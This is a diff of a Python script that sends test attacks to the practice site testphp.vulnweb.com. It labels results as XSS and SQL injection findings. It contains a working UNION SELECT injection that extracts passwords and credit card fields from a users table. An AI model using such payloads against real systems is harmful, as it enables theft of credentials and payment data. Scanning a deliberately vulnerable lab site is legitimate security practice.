@@ -16,7 +16,7 @@ r = requests.post("http://testphp.vulnweb.com/search.php?test=query",
 # print(r.text)
 
 if payload.lower() in r.text.lower():
-  print("/search.php is vulnerable")
+  print("/search.php is vulnerable to XSS")
 
 
 r = requests.post("http://testphp.vulnweb.com/guestbook.php",
@@ -62,3 +62,5 @@ r = requests.get("http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 
 r = requests.get(
     "http://testphp.vulnweb.com/artists.php?artist=-1 UNION SELECT 1, pass, cc FROM users WHERE uname='test'")
 # print(r.text)
+
+print("/artists.php is vulnerable to SQLi")
